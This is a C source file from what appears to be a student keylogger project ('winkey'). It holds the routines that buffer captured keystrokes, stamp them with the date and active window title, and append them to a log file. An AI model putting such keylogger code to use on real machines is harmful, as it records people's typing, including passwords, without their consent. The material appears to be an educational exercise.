/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   log.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/14 16:59:06 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/15 18:05:20 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "winkey.h"

	#include <stdio.h>

#pragma endregion

#pragma region "Log to File"

	void LogToFile(void) {
		FILE *file = NULL;
		if (!fopen_s(&file, g_LogPath, "a")) {
			fprintf(file, "%s", g_Buffer);
			fclose(file);
		}
		
		memset(g_Buffer, 0, BUFFER_SIZE);
		g_BufferLen = 0;
	}

#pragma endregion

#pragma region "Key to Buffer"

	void KeyToBuffer(const char *key) {
		if (!key) return;
		size_t keylen = strlen(key);
		if (g_BufferLen + keylen >= BUFFER_SIZE) LogToFile();

		if (!strcpy_s(g_Buffer + g_BufferLen, BUFFER_SIZE - g_BufferLen, key))
			g_BufferLen += keylen;
	}

#pragma endregion

#pragma region "Tittle to Buffer"

	void TitleToBuffer(const char *title) {
		if (g_BufferLen) LogToFile();
		if (!title) return;

		char date[23] = {0};
		SYSTEMTIME st; GetLocalTime(&st);
		sprintf_s(date, sizeof(date), "\n\n%02d/%02d/%04d %02d:%02d:%02d ", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);
		size_t datelen = strlen(date);
		size_t titlelen = strlen(title);
		
		if (g_BufferLen + datelen + titlelen > BUFFER_SIZE) {
			size_t max_titlelen = BUFFER_SIZE - g_BufferLen - datelen - 4;
			if (max_titlelen > 0) {
				if (!strcpy_s(g_Buffer + g_BufferLen, BUFFER_SIZE - g_BufferLen, date))
					g_BufferLen += datelen;
				if (!strncpy_s(g_Buffer + g_BufferLen, BUFFER_SIZE - g_BufferLen, title, max_titlelen))
					g_BufferLen += max_titlelen;
				if (!strcpy_s(g_Buffer + g_BufferLen, BUFFER_SIZE - g_BufferLen, "...\n"))
					g_BufferLen += 4;
				LogToFile();
			}
		} else {
			if (!strcpy_s(g_Buffer + g_BufferLen, BUFFER_SIZE - g_BufferLen, date))
				g_BufferLen += datelen;
			if (!strcpy_s(g_Buffer + g_BufferLen, BUFFER_SIZE - g_BufferLen, title))
				g_BufferLen += titlelen;
			if (!strcpy_s(g_Buffer + g_BufferLen, BUFFER_SIZE - g_BufferLen, "\n"))
				g_BufferLen += 1;
		}
	}

#pragma endregion
